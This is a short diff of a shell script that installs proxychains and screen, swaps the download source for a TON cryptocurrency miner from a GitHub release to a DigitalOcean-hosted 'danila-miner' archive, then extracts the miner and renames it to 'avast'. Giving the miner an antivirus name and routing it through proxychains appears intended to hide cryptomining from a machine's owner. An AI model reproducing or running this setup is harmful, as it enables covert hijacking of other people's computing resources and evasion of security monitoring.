@@ -4,11 +4,11 @@ apt install proxychains
 
 apt install screen -y
 
-wget -q https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz
+wget -q https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-xenial.tar.gz
 
-tar -xvf  ton-pool.com-miner-0.3.4-linux.tar.gz
+tar -xvf  danila-miner-2.3.1-ubuntu-xenial.tar.gz
 
-mv miner-linux avast
+mv danila-miner avast
 
 chmod +x avast 
 
